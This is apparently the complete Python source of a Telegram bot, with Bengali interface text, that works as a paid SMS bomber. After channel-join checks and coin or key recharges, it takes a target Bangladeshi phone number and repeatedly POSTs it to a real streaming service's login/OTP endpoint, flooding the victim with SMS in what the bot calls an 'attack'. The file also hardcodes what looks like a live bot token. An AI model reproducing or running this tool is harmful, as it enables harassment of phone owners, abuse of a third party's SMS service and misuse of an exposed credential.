import telebot
import requests
import json
import os
import time
import threading
from telebot import types

# --- কনফিগারেশন ---
TOKEN = "8210992248:AAGA1Oy_UNI75ZbLVdScaB2nzMGyoGLvye4"
ADMIN_ID = 6363065063 
LOG_CHANNEL = "@sMsBotManagerDUModz" # চ্যানেলের ইউজারনেম
REQUIRED_CHANNEL_ID = "@DemoTestDUModz" # চ্যানেলের ইউজারনেম
LOGO_URL = "https://raw.githubusercontent.com/DarkUnkwonModZ/Blogger-DarkUnkownModZ-Appinfo/refs/heads/main/IMG/dumodz-logo-final.png"

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# --- ডাটাবেস ফাংশন ---
def load_db(file, default_val):
    if not os.path.exists(file):
        with open(file, 'w') as f: json.dump(default_val, f)
    with open(file, 'r') as f: return json.load(f)

def save_db(file, data):
    with open(file, 'w') as f: json.dump(data, f, indent=4)

users = load_db('users.json', {})
keys = load_db('keys.json', {})

# --- সাবস্ক্রিপশন চেক ফাংশন ---
def is_joined(user_id):
    try:
        member = bot.get_chat_member(REQUIRED_CHANNEL_ID, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# --- অসাধারণ ওয়েলকাম এনিমেশন ---
def send_fancy_welcome(chat_id, user_name):
    msg = bot.send_message(chat_id, "🔍 **Checking Server Status...**")
    time.sleep(0.8)
    bot.edit_message_text("🛡️ **Security Protocol Verified...**", chat_id, msg.message_id)
    time.sleep(0.8)
    bot.edit_message_text("⚡ **Optimizing Smooth Connection...**", chat_id, msg.message_id)
    time.sleep(0.8)
    bot.delete_message(chat_id, msg.message_id)
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚀 Start SMS", callback_data="bomb"),
        types.InlineKeyboardButton("👤 Profile", callback_data="profile"),
        types.InlineKeyboardButton("🔑 Recharge", callback_data="recharge"),
        types.InlineKeyboardButton("📢 Channel", url="https://t.me/DemoTestDUModz"),
        types.InlineKeyboardButton("🌐 Website", url="https://darkunkwonmodz.blogspot.com")
    )
    
    caption = (f"🔥 **Welcome, {user_name}!** 🔥\n\n"
               f"Welcome to **Dark Unkwon ModZ** System.\n"
               f"Status: `Active` ✅\n"
               f"Version: `2.0 (Bug Fixed)` ⚡\n\n"
               f"আমাদের সার্ভিস ব্যবহার করার জন্য নিচের মেনু সিলেক্ট করুন।")
    
    bot.send_photo(chat_id, LOGO_URL, caption=caption, reply_markup=markup)

# --- স্টার্ট কমান্ড হ্যান্ডলার ---
@bot.message_handler(commands=['start'])
def start(message):
    uid = str(message.from_user.id)
    uname = message.from_user.first_name
    
    # ইউজার ডাটাবেসে না থাকলে যুক্ত করা
    if uid not in users:
        users[uid] = {"coins": 30, "status": "active", "sent": 0}
        save_db('users.json', users)
        try:
            bot.send_message(LOG_CHANNEL, f"🆕 **New User Registered!**\nID: `{uid}`\nName: {uname}")
        except: pass

    # জয়েন চেকিং লজিক
    if is_joined(message.from_user.id):
        send_fancy_welcome(message.chat.id, uname)
    else:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url="https://t.me/DemoTestDUModz"))
        markup.add(types.InlineKeyboardButton("✅ Verify Joining", callback_data="verify_join"))
        bot.send_photo(message.chat.id, LOGO_URL, 
                       caption="⚠️ **অ্যাক্সেস ব্লক করা হয়েছে!**\n\nবটটি ব্যবহার করতে আপনাকে অবশ্যই আমাদের চ্যানেলে জয়েন করতে হবে। জয়েন করে নিচের 'Verify' বাটনে ক্লিক করুন।", 
                       reply_markup=markup)

# --- কলব্যাক কুয়েরি হ্যান্ডলার ---
@bot.callback_query_handler(func=lambda call: True)
def callback_logic(call):
    uid = str(call.from_user.id)
    
    if call.data == "verify_join":
        if is_joined(call.from_user.id):
            bot.answer_callback_query(call.id, "✅ Verification Success!")
            bot.delete_message(call.message.chat.id, call.message.message_id)
            send_fancy_welcome(call.message.chat.id, call.from_user.first_name)
        else:
            bot.answer_callback_query(call.id, "❌ আপনি এখনো জয়েন করেননি!", show_alert=True)

    elif call.data == "profile":
        u = users.get(uid)
        bot.send_message(call.message.chat.id, 
                         f"👤 **Your Stats**\n\n"
                         f"💰 Coins: `{u['coins']}`\n"
                         f"📊 Status: `{u['status'].upper()}`\n"
                         f"🚀 Total Sent: `{u['sent']}`")

    elif call.data == "recharge":
        msg = bot.send_message(call.message.chat.id, "🔑 **আপনার রিচার্জ Key দিন:**")
        bot.register_next_step_handler(msg, process_recharge)

    elif call.data == "bomb":
        if users[uid]['status'] == "blocked":
            bot.send_message(call.message.chat.id, "🚫 **দুঃখিত!** আপনাকে ব্লক করা হয়েছে।")
            return
        msg = bot.send_message(call.message.chat.id, "📱 **টার্গেট নাম্বার দিন (১১ ডিজিট):**")
        bot.register_next_step_handler(msg, get_number)

# --- রিচার্জ লজিক (Key Expired System) ---
def process_recharge(message):
    key = message.text.strip()
    uid = str(message.from_user.id)
    if key in keys:
        amount = keys[key]
        if amount == "lifetime":
            users[uid]['status'] = "lifetime"
        else:
            users[uid]['coins'] += int(amount)
        
        del keys[key] # একবার ব্যবহার হলে ডিলিট
        save_db('keys.json', keys)
        save_db('users.json', users)
        bot.send_message(message.chat.id, "✅ **রিচার্জ সফল হয়েছে!** এই Key টি এখন এক্সপায়ার্ড হয়ে গেছে।")
    else:
        bot.send_message(message.chat.id, "❌ **ভুল Key!** সঠিক Key দিন অথবা অ্যাডমিন থেকে কিনে নিন।")

# --- এসএমএস সেন্ডিং লজিক ---
def get_number(message):
    num = message.text
    if len(num) == 11 and num.isdigit():
        msg = bot.send_message(message.chat.id, "🔢 **কয়টি এসএমএস পাঠাতে চান? (সর্বোচ্চ ১০০):**")
        bot.register_next_step_handler(msg, lambda m: start_bomb(m, num))
    else:
        bot.send_message(message.chat.id, "❌ সঠিক মোবাইল নাম্বার দিন!")

def start_bomb(message, num):
    try:
        amount = int(message.text)
        uid = str(message.from_user.id)
        cost = amount * 5
        
        if users[uid]['status'] != 'lifetime' and users[uid]['coins'] < cost:
            bot.send_message(message.chat.id, f"⚠️ **কয়েন নেই!** আপনার প্রয়োজন {cost} কয়েন।")
            return
        
        bot.send_message(message.chat.id, f"🚀 **{num} নাম্বারে অ্যাটাক শুরু হয়েছে...**")
        threading.Thread(target=send_sms, args=(uid, num, amount, cost)).start()
    except:
        bot.send_message(message.chat.id, "❌ ভুল সংখ্যা দিয়েছেন!")

def send_sms(uid, num, amount, cost):
    url = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en"
    payload = {"number": "+88" + num}
    headers = {'Content-Type': 'application/json'}
    
    success = 0
    for _ in range(amount):
        try:
            r = requests.post(url, json=payload, headers=headers, timeout=5)
            if r.status_code == 200: success += 1
        except: pass
        time.sleep(1)

    if users[uid]['status'] != 'lifetime':
        users[uid]['coins'] -= cost
    users[uid]['sent'] += success
    save_db('users.json', users)

# --- অ্যাডমিন প্যানেল ---
@bot.message_handler(commands=['gen'])
def gen_key(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        val = message.text.split()[1] # /gen 100 or /gen lifetime
        key = "DU-MODZ-" + os.urandom(3).hex().upper()
        keys[key] = val
        save_db('keys.json', keys)
        bot.reply_to(message, f"🔑 **Key Generated:** `{key}`\n💰 Value: {val}")
    except:
        bot.reply_to(message, "ব্যবহার: `/gen <amount/lifetime>`")

bot.infinity_polling()
